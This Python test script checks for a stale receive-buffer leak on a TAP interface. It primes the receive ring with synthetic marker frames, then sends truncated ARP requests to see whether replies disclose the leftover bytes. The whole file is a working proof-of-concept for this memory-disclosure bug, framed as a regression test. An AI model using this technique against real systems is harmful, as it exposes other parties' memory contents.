#!/usr/bin/env python3
"""Probe short-ARP stale receive-buffer bytes using synthetic marker data on TAP.

The test primes RX buffers with a non-IP Ethernet frame whose bytes at offsets
22..31 contain a synthetic marker and whose bytes 38..41 equal the guest IP.
It then sends 24-byte ARP requests that omit those fields. A reply addressed
to the primed MAC and containing the marker demonstrates stale-buffer reuse.
Usage: test_arp_short_frame.py TARGET [expect|observe]
"""
from __future__ import annotations

import os
import select
import socket
import struct
import sys
import time
from pathlib import Path

if len(sys.argv) not in (2, 3):
    raise SystemExit("usage: test_arp_short_frame.py TARGET [expect|observe]")

mode = sys.argv[2] if len(sys.argv) == 3 else "expect"
if mode not in {"expect", "observe"}:
    raise SystemExit("mode must be expect or observe")

target = Path(sys.argv[1]).resolve()
TAP = os.environ.get("TAP", "k2t")
GUEST_IP = socket.inet_aton("10.0.2.15")
MARKER_IP = socket.inet_aton("198.51.100.77")
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
sock.bind((TAP, 0))
host_mac = sock.getsockname()[4]
broadcast = b"\xff" * 6


def prime_frame() -> bytes:
    payload = bytearray(28)  # frame offsets 14..41
    payload[8:18] = host_mac + MARKER_IP  # frame offsets 22..31
    payload[24:28] = GUEST_IP             # frame offsets 38..41
    return broadcast + host_mac + b"\x88\xb5" + payload


def short_arp() -> bytes:
    header = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1)
    return broadcast + host_mac + b"\x08\x06" + header + host_mac[:2]


def leaked_marker(frame: bytes) -> bool:
    return (
        len(frame) >= 42
        and frame[12:14] == b"\x08\x06"
        and frame[20:22] == b"\x00\x02"
        and frame[32:38] == host_mac
        and frame[38:42] == MARKER_IP
    )


def wait_marker(timeout: float) -> bool:
    ready, _, _ = select.select([sock], [], [], timeout)
    while ready:
        frame = sock.recv(65536)
        if leaked_marker(frame):
            return True
        ready, _, _ = select.select([sock], [], [], 0)
    return False


if __name__ == "__main__":
    try:
        prime = prime_frame()
        short = short_arp()
        # Fill and wrap the single-queue RX ring with the same synthetic marker.
        for _ in range(512):
            sock.send(prime)
        time.sleep(0.1)
        found = False
        for _ in range(128):
            sock.send(short)
            if wait_marker(0.02):
                found = True
                break
        if mode == "expect" and not found:
            raise SystemExit("FAIL: no short-ARP stale-buffer marker reply observed")
        label = "PASS" if mode == "expect" and found else "OBSERVED"
        print(label + (": short ARP reply disclosed the synthetic stale-buffer marker"
                       if found else ": no stale-buffer marker reply observed"))
        print(f"RESULT: short ARP probe completed in mode={mode}")
    finally:
        sock.close()
